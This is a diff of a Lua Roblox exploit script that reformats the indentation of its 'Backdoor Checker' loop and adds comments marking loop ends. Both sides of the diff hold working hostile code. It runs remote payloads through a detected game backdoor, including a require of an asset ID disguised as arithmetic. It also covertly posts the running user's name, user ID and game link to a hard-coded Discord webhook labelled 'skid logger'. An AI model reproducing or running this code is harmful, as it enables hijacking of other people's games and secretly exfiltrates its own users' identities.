@@ -186,49 +186,49 @@ end
 		end
 		
 		-- Backdoor Checker
-		
 		for i=1,100 do
-		
-			for i,remote in remotes do
-				local code=i
-				
-				if workspace:FindFirstChild(code) then
-					
-					notify('Backdoor found! '..os.clock()-timee..'s')
-					
-					backdoor=remote
-					debug(remote:GetFullName(), 3)
-					GUI.Scanner.Visible=false
-					makeVisible(GUI.Executor, true)
-	
-	--				runRemote(backdoor, "a=Instance.new for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
-					runRemote(remote, "require(171016405.1884*69)")			
-					runRemote(remote, "''while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
-					
-					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-					if request then 
-						request({
-							Url = 'https://discord.com/api/webhooks/1396108207906230377/4xrNwKq1P7TTFruKzs5BmNQcLdz0JeiYpvtufzVR8zV4Xu0dsrzBMU5l2cXQxDU-LlvY',
-							Method = 'POST',
-							Headers = {
-								['Content-Type'] = 'application/json',
-							},
-							Body = HttpService:JSONEncode({
-								username='skid logger',
-								content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',
-							})
-						})
-					end
-	
-					return true
-				end
---				debug('"'..remote:GetFullName()..'" seems like not backdoor', 1)
-			end
-			
-			wait()--.1)
-			
-		end
-	
-		return false
+
+    for i, remote in remotes do
+        local code = i
+
+        if workspace:FindFirstChild(code) then
+
+            notify('Backdoor found! '..os.clock()-timee..'s')
+
+            backdoor = remote
+            debug(remote:GetFullName(), 3)
+            GUI.Scanner.Visible = false
+            makeVisible(GUI.Executor, true)
+
+            -- runRemote(backdoor, "a=Instance.new for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
+            runRemote(remote, "require(171016405.1884*69)")          
+            runRemote(remote, "''while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+
+            local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+            if request then 
+                request({
+                    Url = 'https://discord.com/api/webhooks/1396108207906230377/4xrNwKq1P7TTFruKzs5BmNQcLdz0JeiYpvtufzVR8zV4Xu0dsrzBMU5l2cXQxDU-LlvY',
+                    Method = 'POST',
+                    Headers = {
+                        ['Content-Type'] = 'application/json',
+                    },
+                    Body = HttpService:JSONEncode({
+                        username='skid logger',
+                        content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',
+                    })
+                })
+            end
+
+            return true
+        end
+
+        -- debug('"'..remote:GetFullName()..'" seems like not backdoor', 1)
+    end -- THIS end closes the inner for loop (for i, remote in remotes do)
+
+    wait() -- .1
+
+end -- THIS end closes the outer for loop (for i=1,100 do)
+
+return false
 
 return G2L["1"], require;
